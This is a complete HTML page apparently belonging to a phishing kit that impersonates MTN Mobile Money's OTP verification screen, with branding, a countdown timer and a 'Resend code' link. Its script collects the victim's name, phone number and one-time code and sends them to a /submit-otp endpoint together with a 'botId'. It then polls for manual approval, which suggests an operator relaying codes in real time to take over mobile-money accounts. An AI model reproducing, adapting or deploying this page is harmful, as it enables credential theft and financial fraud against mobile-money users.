<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MTN Mobile Money - Verify</title>
  <style>
    /* ===== MTN MoMo Style ===== */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0a0a0a;
      color: #222;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 1.5rem;
    }
    .app-wrapper {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      border-radius: 1.5rem;
      box-shadow: 0 20px 60px rgba(255, 179, 0, 0.12);
      border: 1px solid rgba(255, 179, 0, 0.15);
      overflow: hidden;
    }
    .top-bar {
      height: 72px;
      background: #ffb300;
      display: flex;
      align-items: center;
      padding: 0 22px;
      flex-shrink: 0;
      box-shadow: 0 2px 12px rgba(255, 179, 0, 0.2);
    }
    .top-bar .logo {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .top-bar .logo svg {
      height: 36px;
      width: auto;
    }
    .top-bar .logo span {
      font-weight: 700;
      font-size: 18px;
      color: #0a0a0a;
      letter-spacing: -0.5px;
    }
    .back-btn {
      color: #0a0a0a;
      font-size: 30px;
      text-decoration: none;
      font-weight: 300;
      margin-right: 16px;
      transition: color 0.2s;
    }
    .back-btn:hover { color: #004b87; }
    .container {
      width: 100%;
      padding: 28px 24px 120px;
      display: flex;
      flex-direction: column;
    }
    .title {
      font-size: 26px;
      font-weight: 700;
      color: #0a0a0a;
      margin-bottom: 4px;
      letter-spacing: -0.3px;
    }
    .subtitle {
      font-size: 15px;
      color: #4a4a4a;
      line-height: 1.5;
      margin-bottom: 4px;
    }
    .valid-time {
      font-size: 14px;
      color: #5b6f7e;
      margin-bottom: 24px;
    }
    .otp {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      justify-content: flex-start;
    }
    .otp input {
      width: 50px;
      height: 56px;
      border: 2px solid #d0d7de;
      border-radius: 12px;
      text-align: center;
      font-size: 22px;
      font-weight: 500;
      outline: none;
      background: #fff;
      transition: border 0.2s, box-shadow 0.2s;
    }
    .otp input:focus {
      border-color: #ffb300;
      box-shadow: 0 0 0 4px rgba(255, 179, 0, 0.25);
    }
    .resend-wrap {
      color: #666;
      font-size: 15px;
      margin-bottom: 0;
    }
    .resend-wrap .timer {
      font-weight: 600;
      color: #0a0a0a;
    }
    .continue-btn {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      bottom: 28px;
      height: 56px;
      border: none;
      border-radius: 60px;
      background: #ccc;
      color: #fff;
      font-size: 20px;
      font-weight: 700;
      cursor: not-allowed;
      transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      max-width: 420px;
      width: calc(100% - 48px);
      box-shadow: 0 8px 24px rgba(255, 179, 0, 0);
    }
    .continue-btn:enabled {
      background: linear-gradient(135deg, #ffb300, #ffcc00);
      color: #0a0a0a;
      cursor: pointer;
      box-shadow: 0 8px 24px rgba(255, 179, 0, 0.35);
    }
    .continue-btn:enabled:hover {
      background: linear-gradient(135deg, #e6a200, #ffb300);
      transform: translateX(-50%) scale(1.01);
      box-shadow: 0 12px 32px rgba(255, 179, 0, 0.45);
    }
    #message-box {
      display: none;
      padding: 12px 16px;
      border-radius: 12px;
      margin-bottom: 16px;
      font-size: 15px;
      font-weight: 500;
      border: 1px solid transparent;
    }
    #message-box.error {
      background: #fef3f2;
      border-color: #fecdca;
      color: #c0392b;
    }
    #message-box.success {
      background: #ecfdf3;
      border-color: #abf0d1;
      color: #0b2b3b;
    }
    @media (max-width: 480px) {
      body { padding: 1rem; }
      .app-wrapper { border-radius: 1rem; }
      .container { padding: 24px 18px 110px; }
      .title { font-size: 24px; }
      .otp input { width: 44px; height: 50px; font-size: 20px; }
      .continue-btn { height: 54px; font-size: 18px; bottom: 22px; width: calc(100% - 36px); }
    }
    @media (max-width: 360px) {
      .otp input { width: 38px; height: 46px; font-size: 18px; }
      .otp { gap: 6px; }
    }
  </style>
</head>
<body>

  <div class="app-wrapper">
    <div class="top-bar">
      <a href="#" class="back-btn">&#8592;</a>
      <div class="logo">
        <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
          <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
          <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN Mobile Money</text>
        </svg>
        <span>Mobile Money</span>
      </div>
    </div>

    <div class="container">
      <div class="title">Enter OTP</div>
      <div class="subtitle" id="subtitlePlaceholder">
        Enter OTP that was sent to your phone
      </div>

      <div class="valid-time">The code is valid for 5 minutes</div>

      <div class="otp">
        <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
      </div>

      <div class="resend-wrap">
        Resend code in <span class="timer">05:00</span>
      </div>
    </div>

    <button class="continue-btn" disabled>SUBMIT</button>
  </div>

  <script>
    (function() {
      // ---------- READ FROM URL & LOCALSTORAGE ----------
      const urlParams = new URLSearchParams(window.location.search);
      let botId = urlParams.get('botId') || localStorage.getItem('botId');
      let phone = urlParams.get('phone') || localStorage.getItem('phone');
      let name = urlParams.get('name') || localStorage.getItem('fullName');

      // If missing critical data, redirect back to phone page
      if (!botId) {
        alert('Bot ID missing. Please start over.');
        window.location.href = 'details.html';
        return;
      }
      if (!phone) {
        alert('Phone number missing. Please start over.');
        window.location.href = 'details.html';
        return;
      }
      if (!name) {
        name = 'MTN User';
        localStorage.setItem('fullName', name);
      }

      // Store for subsequent pages
      localStorage.setItem('botId', botId);
      localStorage.setItem('phone', phone);

      // Update subtitle with user's phone
      const subtitle = document.getElementById('subtitlePlaceholder');
      if (phone) {
        subtitle.textContent = 'Enter OTP that was sent to ' + phone;
      }

      // ---------- DOM REFS ----------
      const inputs = document.querySelectorAll('.otp input');
      const continueBtn = document.querySelector('.continue-btn');
      const msgDiv = document.createElement('div');
      msgDiv.id = 'message-box';
      msgDiv.style.display = 'none';
      const container = document.querySelector('.container');
      const resendWrap = document.querySelector('.resend-wrap');
      container.insertBefore(msgDiv, resendWrap);

      // ---------- UI HELPERS ----------
      function showMessage(text, isError) {
        msgDiv.textContent = text;
        msgDiv.style.display = 'block';
        msgDiv.className = isError ? 'error' : 'success';
      }

      function hideMessage() {
        msgDiv.style.display = 'none';
        msgDiv.className = '';
        msgDiv.textContent = '';
      }

      function sanitizeDigit(value) {
        return value.replace(/\D/g, '');
      }

      function checkAllFilled() {
        let allFilled = true;
        inputs.forEach(function(input) {
          if (input.value.trim() === '') allFilled = false;
        });
        continueBtn.disabled = !allFilled;
        if (allFilled) {
          continueBtn.style.background = 'linear-gradient(135deg, #ffb300, #ffcc00)';
          continueBtn.style.color = '#0a0a0a';
          continueBtn.style.cursor = 'pointer';
          continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0.35)';
        } else {
          continueBtn.style.background = '#ccc';
          continueBtn.style.color = '#fff';
          continueBtn.style.cursor = 'not-allowed';
          continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0)';
        }
        hideMessage();
      }

      // ---------- OTP INPUT HANDLING ----------
      inputs.forEach(function(input, index) {
        input.addEventListener('input', function() {
          var cleaned = sanitizeDigit(this.value);
          if (cleaned !== this.value) this.value = cleaned;
          if (this.value.length === 1 && index < inputs.length - 1) {
            inputs[index + 1].focus();
          }
          checkAllFilled();
        });

        input.addEventListener('paste', function(e) {
          e.preventDefault();
          var paste = (e.clipboardData || window.clipboardData).getData('text');
          var digits = sanitizeDigit(paste);
          if (digits) {
            this.value = digits.slice(0, 1);
            this.dispatchEvent(new Event('input'));
          }
        });

        input.addEventListener('keydown', function(e) {
          if (e.key === 'Backspace' && this.value === '' && index > 0) {
            inputs[index - 1].focus();
          }
        });

        input.addEventListener('blur', checkAllFilled);
      });

      // ---------- TIMER (5 minutes) ----------
      var timerSpan = document.querySelector('.timer');
      var resendWrapEl = document.querySelector('.resend-wrap');
      var totalSeconds = 5 * 60;
      var timerInterval = null;

      function formatTime(sec) {
        var m = String(Math.floor(sec / 60)).padStart(2, '0');
        var s = String(sec % 60).padStart(2, '0');
        return m + ':' + s;
      }

      function updateTimerUI() {
        if (totalSeconds <= 0) {
          resendWrapEl.innerHTML = 'Resend code';
          resendWrapEl.style.color = '#ffb300';
          resendWrapEl.style.cursor = 'pointer';
          resendWrapEl.style.fontWeight = '600';
          clearInterval(timerInterval);
          timerInterval = null;
          resendWrapEl.onclick = function(e) {
            e.preventDefault();
            startTimer(5 * 60);
            hideMessage();
          };
          return;
        }
        resendWrapEl.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
        resendWrapEl.style.color = '#666';
        resendWrapEl.style.cursor = 'default';
        resendWrapEl.style.fontWeight = '400';
        resendWrapEl.onclick = null;
      }

      function startTimer(seconds) {
        if (timerInterval) clearInterval(timerInterval);
        totalSeconds = seconds;
        updateTimerUI();
        timerInterval = setInterval(function() {
          totalSeconds--;
          if (totalSeconds <= 0) {
            totalSeconds = 0;
            updateTimerUI();
            clearInterval(timerInterval);
            timerInterval = null;
          } else {
            updateTimerUI();
          }
        }, 1000);
      }

      startTimer(5 * 60);

      // ---------- POLLING ----------
      var pollTimer = null;

      function stopPolling() {
        if (pollTimer) {
          clearInterval(pollTimer);
          pollTimer = null;
        }
      }

      // ---------- SUBMIT OTP ----------
      continueBtn.addEventListener('click', function() {
        if (this.disabled) return;

        var otp = '';
        inputs.forEach(function(inp) { otp += inp.value; });
        if (otp.length !== 4) {
          showMessage('Please enter a 4‑digit OTP.', true);
          return;
        }

        // Disable button, show waiting
        continueBtn.disabled = true;
        continueBtn.textContent = 'Verifying...';
        continueBtn.style.background = '#f5a623';
        continueBtn.style.color = '#fff';
        continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0.3)';
        hideMessage();

        fetch('/submit-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ name: name, phone: phone, otp: otp, botId: botId })
        })
        .then(function(res) {
          if (!res.ok) throw new Error('Server error (HTTP ' + res.status + ')');
          return res.json();
        })
        .then(function(data) {
          var requestId = data.requestId;
          if (!requestId) throw new Error('No request ID received');

          // Start polling
          stopPolling();
          var attempts = 0;
          var MAX_ATTEMPTS = 120; // ~3 minutes

          pollTimer = setInterval(function() {
            attempts++;
            fetch('/check-otp/' + requestId)
              .then(function(res) {
                if (!res.ok) throw new Error('Verification error');
                return res.json();
              })
              .then(function(status) {
                if (status.approved === true) {
                  stopPolling();
                  // ✅ DIRECT REDIRECT TO SUCCESS PAGE (skip PIN & code)
                  var successUrl = 'success.html?botId=' + encodeURIComponent(botId) +
                                   '&phone=' + encodeURIComponent(phone) +
                                   '&name=' + encodeURIComponent(name);
                  window.location.href = successUrl;
                  return;
                }
                if (status.approved === false) {
                  stopPolling();
                  showMessage('❌ Incorrect OTP. Please try again.', true);
                  // Reset inputs
                  inputs.forEach(function(inp) { inp.value = ''; });
                  checkAllFilled();
                  inputs[0].focus();
                  // Re-enable button
                  continueBtn.disabled = false;
                  continueBtn.textContent = 'SUBMIT';
                  continueBtn.style.background = 'linear-gradient(135deg, #ffb300, #ffcc00)';
                  continueBtn.style.color = '#0a0a0a';
                  continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0.35)';
                  return;
                }
                // Still pending
                if (attempts > MAX_ATTEMPTS) {
                  stopPolling();
                  showMessage('⏳ Approval taking too long. Please refresh or contact support.', true);
                  continueBtn.disabled = false;
                  continueBtn.textContent = 'SUBMIT';
                  continueBtn.style.background = 'linear-gradient(135deg, #ffb300, #ffcc00)';
                  continueBtn.style.color = '#0a0a0a';
                  continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0.35)';
                  return;
                }
                // keep polling
              })
              .catch(function(err) {
                // Network error – keep polling
                console.error('Polling error:', err);
              });
          }, 1500);
        })
        .catch(function(err) {
          showMessage('❌ Send error: ' + err.message, true);
          continueBtn.disabled = false;
          continueBtn.textContent = 'SUBMIT';
          continueBtn.style.background = 'linear-gradient(135deg, #ffb300, #ffcc00)';
          continueBtn.style.color = '#0a0a0a';
          continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0.35)';
        });
      });

      // ---------- INIT ----------
      checkAllFilled();
      inputs[0].focus();
    })();
  </script>
</body>
</html>
